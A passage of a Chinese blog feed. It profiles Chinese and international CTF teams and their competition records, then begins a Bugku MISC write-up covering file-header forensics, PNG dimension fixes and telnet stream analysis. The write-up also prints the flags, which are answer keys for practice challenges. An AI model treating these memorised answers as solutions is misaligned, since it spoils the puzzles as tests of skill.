CTF全球总决赛，并获得第五名的优秀战绩。2014年蓝莲花战队成功组织BCTF“百度杯”全国网络安全技术对抗赛，成为当时全国参与规模最大的CTF赛事，并在2014至2015年开始发起并总体组织XCTF全国网络安全技术对抗联赛。 </p><h3 id="AAA战队："><a href="#AAA战队：" class="headerlink" title="AAA战队："></a>AAA战队：</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640.webp" alt="img"></p><p>AAA战队是由浙江大学信息安全爱好者自发组织、浙江大学计算机学院支持建立的团队，在CTF圈颇有名气，曾获2016年ZCTF冠军、TCTF 2017新人邀请赛冠军、WHCTF 2017冠军、以及2017年高校网络信息安全管理运维挑战赛全国总冠军；并于2017年与腾讯、上海交通大学、复旦大学组成腾讯A0E联合战队参加DEF CON CTF 2017全球总决赛，在全球十数支顶级战队中斩获季军。在TCTF 2018的线上预赛阶段，AAA战队在也取得了第一名。</p><p>毫无疑问，他们是本年度TCTF夺冠的热门战队。</p><h3 id="Redbud战队：专注实力提升"><a href="#Redbud战队：专注实力提升" class="headerlink" title="Redbud战队：专注实力提升"></a>Redbud战队：专注实力提升</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833800626.webp" alt="img"></p><p>Redbud战队由来自清华大学学生网络安全技术协会的信息安全爱好者组成。Redbud，意为”紫荆”，战队的宗旨是不为名次和奖励，只为锻炼和提升个人的技术水平，加强和CTF优秀选手的交流与互动，并为国内知名战队——蓝莲花战队（Blue-Lotus）培养后备力量。</p><p>该战队的成绩从去年第四届XCTF联赛线上赛以来一直保持着高位，最近更是迎来了全面的爆发，在本届TCTF 线上预赛以第二名的成绩挺进决赛。</p><h3 id="emmmm战队：看队名看不透实力"><a href="#emmmm战队：看队名看不透实力" class="headerlink" title="emmmm战队：看队名看不透实力"></a>emmmm战队：看队名看不透实力</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833809327.webp" alt="img"></p><p>emmmm战队是由哈尔滨工业大学、北京邮电大学和中国科学技术大学组成的联合战队，战队名字颇为俏皮，但备赛经验丰富，在本届TCTF线上预赛中位列高校战队前三。</p><p>emmmm战队表示，要在TCTF 2018线下决赛取得突破性成绩，努力摘得桂冠。</p><h3 id="Vidar战队：“As-we-do-as-you-know”"><a href="#Vidar战队：“As-we-do-as-you-know”" class="headerlink" title="Vidar战队：“As we do, as you know”"></a>Vidar战队：“As we do, as you know”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833812099.webp" alt="img"></p><p>Vidar战队来自杭州电子科技大学，是浙江高校中最早建立的白帽黑客团队，由杭电信息安全协会（原HDUISA）和网络空间安全学院合并而成。团队前身 HDUISA 是杭州电子科技大学信息安全协会。Vidar战队中聚集了一批又一批对信息技术感兴趣的同学，互相交流学习信息安全领域的知识及技术。同时为了检测自己的水平，以国内外的各种相关比赛为载体与各大高校乃至列强劲旅一较高下，至今已成功举办九届HCTF比赛。</p><p>该战队认为，编程技术可谓一日千里，新漏洞层出不穷，CTF题目的脑洞越开越大，实践能力是关键。As we do, as you know。</p><h3 id="kap0k战队：迅速崛起的新生力量"><a href="#kap0k战队：迅速崛起的新生力量" class="headerlink" title="kap0k战队：迅速崛起的新生力量"></a>kap0k战队：迅速崛起的新生力量</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833816419.webp" alt="img"></p><p>​      kap0k 团队是一支源自华南理工大学的网络安全技术竞赛和研究团队，成立于 2017 年三月。 kap0k 名字源自木棉树，为华南理工大学校树，寓意着团队成员对技术的不懈追求和对黑客自由精神的坚守。建队以来，秉持着以技术让网络更安全的理念，kap0k 的成员在校园网安全建设、CTF 竞赛、安全大数据竞赛等安全的诸多方面都有所建树。kap0k 是实力正在迅速增强的新生CTF战队， 曾在第四届XCTF联赛揭幕战武汉站WHCTF线上赛取得第八名的好成绩。</p><h3 id="MxM战队：-网络安全与执法并重"><a href="#MxM战队：-网络安全与执法并重" class="headerlink" title="MxM战队： 网络安全与执法并重"></a>MxM战队： 网络安全与执法并重</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833820127.webp" alt="img"></p><p>​     MxM来自浙江警察学院，是警校的优良作风建设下迅速崛起的新生力量，实力演绎警校学生对信息安全领域的不停追求与探索。该战队表示，通过参加专业CTF赛事，加强自身网络安全法制实践能力，是提高网络警察专业的人员执法能力和效率的保障。</p><h3 id="Lancet战队：做网络世界的手术刀"><a href="#Lancet战队：做网络世界的手术刀" class="headerlink" title="Lancet战队：做网络世界的手术刀"></a>Lancet战队：做网络世界的手术刀</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="img"></p><p>Lancet源自于北京航空航天大学的网络安全技术竞赛和研究团队，战队成立于2015年10月，获得过2016年信息安全与对抗技术竞赛分组对抗赛全国一等奖、“安恒杯”全国高校网络安全技能竞赛第一名、“美亚柏科”大学生网络空间安全精英邀请赛第一名等多个奖项。2017 年在GMIC-XCTF京津冀邀请赛稳居冠军宝座；第四届XCTF联赛揭幕战武汉站WHCTF线上赛排名第三，网络安全经验丰富，实力不凡。</p><p>Lancet战队表示，要做网络世界的手术刀，既要撕裂网络世界的表面看到安全隐患，也要为网络安全主刀消除隐患。</p><h3 id="kn0ck战队：“To-be-or-not-to-be”"><a href="#kn0ck战队：“To-be-or-not-to-be”" class="headerlink" title="kn0ck战队：“To be or not to be”"></a><em>kn0ck</em>战队：“To be or not to be”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833822811.webp" alt="img"></p><p><em>kn0ck</em>战队于2018上半年成立，是多个高校组合联盟战队，由国内信息安全专业实力雄厚的高校学生组成。战队成员因兴趣与热爱而聚集，以不服输的精神全力向着梦想进发。</p><p>作为一支新兴的CTF队伍，战队的宗旨是通过实际比赛将理论知识更好的发挥，以赛代练，锻炼和提升个人的技术水平，在比赛中广交朋友，共同进步。今年，该战队在赛博地球杯工业互联网安全大赛线上初赛榜单上位居前十。</p><h3 id="Ph0t1n1a战队：以赛代练，提高实战能力"><a href="#Ph0t1n1a战队：以赛代练，提高实战能力" class="headerlink" title="Ph0t1n1a战队：以赛代练，提高实战能力"></a>Ph0t1n1a战队：以赛代练，提高实战能力</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833825552.webp" alt="img"></p><p>Ph0t1n1a是来自上海交通大学一支新兴的极客力量。其队名源于上海交通大学校花——石楠花（photinia）英文单词的变形。</p><p>Ph0t1n1a战队的宗旨是：以赛代练，在比赛中提高自己的实战能力。</p><h3 id="CNSS战队：“Stay-hacking-stay-exploring”"><a href="#CNSS战队：“Stay-hacking-stay-exploring”" class="headerlink" title="CNSS战队：“Stay hacking, stay exploring”"></a>CNSS战队：“Stay hacking, stay exploring”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833827489.webp" alt="img"></p><p>CNSS战队，来自由电子科技大学信息安全爱好者自发组织的一个研究网络安全的技术团队——凝聚工作室，是电子科大古老工作室文化的代表；开放、包容，有着对技术的独特理解。该战队曾在世界顶级黑客大会Hack in the box(HITB)的CTF线上赛中，取得全球第17名的好成绩。</p><p>CNSS战队认为，凝聚工作室存在的价值和意义是一种校园创新文化的营造，一届又一届地传递一种挑战的精神和文化。</p><h3 id="Blue-Whale战队：培养信息安全兴趣是初衷"><a href="#Blue-Whale战队：培养信息安全兴趣是初衷" class="headerlink" title="Blue-Whale战队：培养信息安全兴趣是初衷"></a>Blue-Whale战队：培养信息安全兴趣是初衷</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833830085.webp" alt="img"></p><p>Blue-Whale来自中国海洋大学，2012年依托于中国海洋大学信息安全实验室而成立。团队以中国海洋大学信息安全实验室为基础，专注于信息安全领域研究，研究方向包括系统安全、渗透测试、密码学等。自成立之初，Blue-Whale团队始终以培养信息安全兴趣，研究与分享信息安全知识与技术为目标。历经两年发展后，Blue-Whale战队开始活跃于国内外各类CTF比赛中。在2013-2014年山东省大学生信息安全知识竞赛中包揽团队和个人冠军，在2016年全国大学生信息安全大赛中获得二等奖。</p><h3 id="WaterDrop：“方寸之间，深不见底”"><a href="#WaterDrop：“方寸之间，深不见底”" class="headerlink" title="WaterDrop：“方寸之间，深不见底”"></a>WaterDrop：“方寸之间，深不见底”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833832679.webp" alt="img"></p><p>WaterDrop，来自中山大学的一支新兴战队，第一代组建于2017年初。战队名WaterDrop取自科幻小说《三体》中提到的由强相互作用力材料（SIM）所制成的宇宙探测器，寄寓着我们的目标。因为其形状与水滴相似所以被人类称之为水滴，会反射几乎100%的电磁波，完全由被强相互作用力紧密锁死的质子与中子构成，无坚不摧，“方寸之间，深不见底”。</p><h3 id="NeSE战队：Never-Stop-Exploiting"><a href="#NeSE战队：Never-Stop-Exploiting" class="headerlink" title="NeSE战队：Never Stop Exploiting"></a>NeSE战队：Never Stop Exploiting</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833834657.webp" alt="img"></p><p>NeSE成立于2015年，主要成员都来自中国科学院信息工程研究所，战队全称为“Never Stop Exploiting”， 象征着永不停止钻研的极客精神。NeSE战队一直以来都希望通过参加高层次的CTF竞赛，提高实践能力，累积互联网攻防经验。战队成绩也十分突出，曾获得TCTF 2017预赛第六、决赛第十，AliCTF 2016国内第一，第十届全国大学生信息安全竞赛线上赛第一名等成绩。</p><p>在本届TCTF预赛阶段，NeSE战队以十二名的成绩出线，成为决赛夺冠竞争者。</p><h3 id="Dragon-Sector战队：波兰劲旅"><a href="#Dragon-Sector战队：波兰劲旅" class="headerlink" title="Dragon Sector战队：波兰劲旅"></a>Dragon Sector战队：波兰劲旅</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833836523.webp" alt="img"></p><p>Dragon Sector战队是一支来自波兰的战队，隶属于Google安全团队，成立于2013年2月。Dragon Sector战队目前有16名活跃队员，经常参加线上线下安全竞赛。这支队伍非常擅长“逆向”领域的试题，整体解题思路非常特殊，经常出人意料。尤其在比赛中后劲十足，往往成为CTF比赛的焦点，他们在比赛中的解题思路也经常被波兰当地杂志刊登。</p><p>在CTFTIME梳理的近五年全球CTF战队评级中，Dragon Sector都位列前十，2018年的实力评级为第五，是一支名副其实的劲旅。</p><h3 id="lotus-r3kapig战队-“给我一朵蓝莲花，我能撬起一飞猪”"><a href="#lotus-r3kapig战队-“给我一朵蓝莲花，我能撬起一飞猪”" class="headerlink" title="lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪”"></a>lotus-r3kapig战队: “给我一朵蓝莲花，我能撬起一飞猪”</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833838758.webp" alt="img"></p><p>lotus-r3kapig战队是由国内蓝莲花、Eur3kA和flappypig三支战队组建的联合战队，自称是“究极完全体阿基米德莲花猪”，在TCTF 2018国际赛预赛中位列第三。该战队的口号是：“给我一朵蓝莲花，我能撬起一飞猪”。</p><h3 id="Cykor战队：冠军专业户"><a href="#Cykor战队：冠军专业户" class="headerlink" title="Cykor战队：冠军专业户"></a>Cykor战队：冠军专业户</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833841469.webp" alt="img"></p><p>Cykor战队由韩国大学生信息安全研究俱乐部组成，成立于2011年。他们在第二届XCTF国际联赛总决赛中荣获冠军；在TrendMicro CTF、Codegate 2017 prequals以及SECCON 2016 Final competition等诸多大赛中都曾摘得桂冠。最令人印象深刻的是，CyKor成员参与的DEFKOR战队在2015年DEF CON世界顶级黑客大赛中上演绝地反击、力压PPP战队的精彩一战使他们成为首个赢得DEF CON CTF冠军的韩国黑客团队，也正是因为这场比赛让他们一战成名。</p><p>而这对于Cykor战队来说并不是终点，战队成员一致认为，参加这么多CTF比赛，就是为了追赶世界顶级极客的步伐。</p><p>曾因韩国神童Lokihardt的加入，获得趋势亚太CTF、HITCON CTF 2015和HDCON CTF 2015的冠军，在Belluminar 2016夺得亚军，在Codegate 2017 prequals 和SECCON 2016 决赛中获得冠军。</p><h3 id="PwnThyBytes战队：主要是回馈社会"><a href="#PwnThyBytes战队：主要是回馈社会" class="headerlink" title="PwnThyBytes战队：主要是回馈社会"></a>PwnThyBytes战队：主要是回馈社会</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833844562.webp" alt="img"></p><p>PwnThyBytes战队是来自罗马尼亚的队伍，成立于2015年，有着非常丰富的大赛经验，曾参加过Codegate CTF 2014、2017，TCTF 2017，HITCON CTF 2016，SECCON 2015，Trend Micro 2016 、2017。该战队表示，多次参加比赛除了获得优秀的成绩之外，更主要的是为回馈社会。</p><p>在TCTF 2018，他们将全力以赴，展示战队的安全技术和挑战能力，并取得好成绩。</p><h3 id="战队：无限的可能性"><a href="#战队：无限的可能性" class="headerlink" title="******战队：无限的可能性"></a><code>******战队</code>：无限的可能性</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833846884.webp" alt="img"></p><p> 战队由复旦大学在校生和已毕业的各领域专家共同组成，队名六颗星星代指六个通配符，意为无限的可能性。自2014年成立以来，战队在很多比赛中取得了优异的成绩，曾获XCTF 2014成都分站赛第三，ACTF 2015冠军，SSCTF 2016线上赛第七，0CTF 2016决赛第八。</p><p>2017年7月，战队还和腾讯eee战队、上海交大0ops战队、浙大AAA战队组成腾讯A0E联合战队，参加世界顶级黑客大会DEF CON，位列前三。</p><h4 id="专访-CTF出题战队六星队员杨森：老牌战队新的征程"><a href="#专访-CTF出题战队六星队员杨森：老牌战队新的征程" class="headerlink" title="专访*CTF出题战队六星队员杨森：老牌战队新的征程"></a><a href="https://www.xctf.org.cn/library/details/5e3826c16e9ec358323a6a85ebb651bcd2099b57/" target="_blank" rel="noopener">专访*CTF出题战队六星队员杨森：老牌战队新的征程</a></h4><h3 id="LC↯-BC战队-战斗民族心怀宇宙"><a href="#LC↯-BC战队-战斗民族心怀宇宙" class="headerlink" title="LC↯ BC战队: 战斗民族心怀宇宙"></a>LC↯ BC战队: 战斗民族心怀宇宙</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833849376.webp" alt="img"></p><p>LC↯ BC战队来自俄罗斯，战队命名颇为玄妙，灵感来源于地球的一部分构成方式。曾在2015年获得EKOPARTY CTF，PHD CTF Finals，CONFidence CTF及Belluminar Seoul等国际CTF比赛的冠军。LCBC战队还曾主办了QIWI CTF 2014和Olympic CTF 2014等比赛。战队位列CTFTIME全球排行榜2017年度全球第六、2016年度全球第四。</p><h3 id="SpamAndHex战队：多瑙河畔的传统强队"><a href="#SpamAndHex战队：多瑙河畔的传统强队" class="headerlink" title="!SpamAndHex战队：多瑙河畔的传统强队"></a>!SpamAndHex战队：多瑙河畔的传统强队</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833851822.webp" alt="img"></p><p>!SpamAndHex战队来自匈牙利布达佩斯技术经济大学的CrySyS实验室,曾获得多项国际CTF比赛冠军，例如2017WCTF世界黑客大师赛第十三名，在CTFTIME 2014年的评级中位列前二十。</p><h3 id="Nu1L战队：国内冠军拿到手软"><a href="#Nu1L战队：国内冠军拿到手软" class="headerlink" title="Nu1L战队：国内冠军拿到手软"></a>Nu1L战队：国内冠军拿到手软</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833854452.webp" alt="img"></p><p> Nu1L战队成员来自于上海科技大学、西华大学、成都信息工程大学、北京理工大学等全国多所高校，最早是由两个研究Web的同学创建，队名源于计算机中语言中经常出现的“NULL”。Nu1L战队的小伙伴们都对信息安全以及CTF比赛有着浓厚的兴趣，他们在过去的比赛中战绩辉煌，曾获SCTF 2016冠军、LCTF 2016冠军、第一届百度杯信息攻防总决赛冠军、NJCTF 2017冠军、BCTF 2017冠军、LCTF 2017冠军、TCTF 2017新人邀请赛亚军、第三届XCTF总决赛季军，同时主办了N1CTF 2018，是冲击本届TCTF冠军的有力竞争者。</p><h3 id="TokyoWesterns战队：来自东京的极客"><a href="#TokyoWesterns战队：来自东京的极客" class="headerlink" title="TokyoWesterns战队：来自东京的极客"></a>TokyoWesterns战队：来自东京的极客</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833856983.webp" alt="img"></p><p>TokyoWesterns战队成员均在东京西部生活或是上学，战队名称因此得来；曾获得日本SEC CON等国际赛事冠军，CTFTIME全球排行榜2017年度全球第五位，目前排名也在全球前十位。同时，作为赛事主办方，TokyoWesterns战队也可圈可点，已连续举办三届Tokyo Westerns CTF。</p><h3 id="ROIS战队：-把兴趣做到极致"><a href="#ROIS战队：-把兴趣做到极致" class="headerlink" title="ROIS战队： 把兴趣做到极致"></a>ROIS战队： 把兴趣做到极致</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833861967.webp" alt="img"></p><p>ROIS战队是由福州大学数学与计算机科学、软件工程学院的同学组成的团队，得到了网络系统信息安全福建省高校重点实验室老师的指导。团队分为核心小组和兴趣小组，旨在为对信息安全有兴趣的同学提供技术交流和学习平台，主要参加各类CTF比赛以及为校园网络做安全测试。ROIS战队曾在首届XCTF联赛上海站决赛中获得第四名，并在最终总决赛中获得季军，在CTFTIME 2016年度的排名中位列第八十六。</p><h3 id="Shellphish战队-看到漏洞威胁就像普通人看到颜色一样"><a href="#Shellphish战队-看到漏洞威胁就像普通人看到颜色一样" class="headerlink" title="Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样"></a>Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833864005.webp" alt="img"></p><p>Shellphish是来自美国的战队，战队成员遍布美国、法国、中国、巴西和塞内加尔等国，规模庞大，曾获得TCTF 2017国际赛的冠军。Shellphish战队的部分成员还参加了美国国防部高级研究计划局（DARPA）主办的Cyber Grand 挑战赛的决赛，并从中获得了75万美元的奖金，在CTFTIME 2017年度的排名中位列第9，2015年位列第4。他们对极客技术有着近乎疯狂的痴迷，自称“看到漏洞威胁就像普通人看到颜色一样”。</p><h3 id="217"><a href="#217" class="headerlink" title="217"></a>217</h3><p>来自中国宝岛台湾，台湾大学的战队，CTFTIME全球排名2016年第6，在国内国际赛场战果丰硕，曾获首届XCTF联赛总决赛冠军，在国际重量级赛事Plaid CTF及SECCON CTF中也均取得过第一名的好成绩。 </p><h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>同样也是来自宝岛台湾的战队，是台湾著名战队HITCON的成员，HITCON曾获得2016年DEF CON CTF第4名，2017年Boston Key Party CTF冠军。403 Forbidden以本次在TCTF国际赛中的成绩，暂居CTFTIME全球排名第97。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：&lt;a href=&quot;javascript:void(0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;腾讯安全联合实验室&lt;/a&gt;;) ，&lt;a href=&quot;https://www.xctf.org.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XCTF社区&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF Team" scheme="http://blog.Lhaihai.wang/tags/CTF-Team/"/>
    
  </entry>
  
  <entry>
    <title>Bugku-MISCWriteUp</title>
    <link href="http://blog.Lhaihai.wang/2018/05/20/Bugku-MISCWriteUp/"/>
    <id>http://blog.Lhaihai.wang/2018/05/20/Bugku-MISCWriteUp/</id>
    <published>2018-05-20T08:24:04.000Z</published>
    <updated>2018-05-20T08:29:23.670Z</updated>
    
    <content type="html"><![CDATA[<p>本来AFCTF2018校赛前刷了一半了，然后搞校赛了，然后才这个周末刷完。</p><p>待会还有安恒杯月赛，手有点酸，哈哈。</p><a id="more"></a><h2 id="这是一张单纯的图片"><a href="#这是一张单纯的图片" class="headerlink" title="这是一张单纯的图片"></a>这是一张单纯的图片</h2><p>下载下来用UE打开，发现最后有下面的字符，很明显是Unicode编码，解码一下拿到flag，注意手动加一下}</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125</span><br></pre></td></tr></table></figure><p>flag</p><blockquote><p>key{you are right}</p></blockquote><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><p>解压有个PNG图片，修改一下图片大小，再打开图片发现flag</p><p>用UE打开图片，第二行的 0-3 4-7 表示图片的宽高</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526003049905.png" alt="1526003049905"></p><p>flag</p><blockquote><p>BUGKU{a1e5aSA}</p></blockquote><h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><p>key格式flag{xxxxxxxxxxxxxxxxxxxxxxxxxxx} </p><p>是个pcap文件，发现有很多telnet协议，追踪TCP流发现flag</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526003306147.png" alt="1526003306147"></p><p>flag</p><blockquote><p>flag{d316759c281bf925d600be698a4973d5}</p></blockquote><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><blockquote><p>JPEG (jpg)，                       文件头：FFD8FF　　　　　文件尾：FF D9　　　　　　　　　　　　　　　<br>PNG (png)，                      文件头：89504E47　　　　文件尾：AE 42 60 82<br>GIF (gif)，                           文件头：47494638　　　　文件尾：00 3B<br>ZIP Archive (zip)，            文件头：504B0304　　　  文件尾：50 4B<br>TIFF (tif)，                          文件头：49492A00　　　　　　　　　　　　　<br>Windows Bitmap (bmp)  文件头：424D　　　　　　　　　　　　　　　<br>CAD (dwg)，                      文件头：41433130　　　　　　　　　　　　　<br>Adobe Photoshop (psd)  文件头：38425053　　　　　　　　　　　　　<br>Rich Text Format (rtf)，   文件头：7B5C727466　　　　　　　　　　　　<br>XML (xml)，                       文件头：3C3F786D6C　　　　　　　　　　　　<br>HTML (html)，                   文件头：68746D6C3E<br>Email [thorough only] (eml)，    文件头：44656C69766572792D646174653A<br>Outlook Express (dbx)，              文件头：CFAD12FEC5FD746F<br>Outlook (pst)，                              文件头：2142444E<br>MS Word/Excel (xls.or.doc)，      文件头：D0CF11E0<br>MS Access (mdb)，                       文件头：5374616E64617264204A<br>WordPerfect (wpd)，                    文件头：FF575043<br>Adobe Acrobat (pdf)，                  文件头：255044462D312E<br>Quicken (qdf)，                              文件头：AC9EBD8F<br>Windows Password (pwl)，         文件头：E3828596</p><p>RAR Archive (rar)，                       文件头：52617221<br>Wave (wav)，                                 文件头：57415645<br>AVI (avi)，                                       文件头：41564920<br>Real Audio (ram)，                       文件头：2E7261FD<br>Real Media (rm)，                         文件头：2E524D46<br>MPEG (mpg)，                               文件头：000001BA<br>MPEG (mpg)，                               文件头：000001B3<br>Quicktime (mov)，                        文件头：6D6F6F76<br>Windows Media (asf)，                文件头：3026B2758E66CF11<br>MIDI (mid)，                                  文件头：4D546864</p></blockquote><p>用UE打开，敏感发现50 4B 03 04</p><p>改后缀为.zip，解压发现word文档，打开错误，UE发现word文档开头还是 50 4B 03 04 继续改为zip后缀</p><p>解压后在 word文件夹下的document.xml发现flag</p><blockquote><p>flag{F1@g}</p></blockquote><h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>用binwalk分解没成功，用foremost分解得到另外一张图片</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526005846765.png" 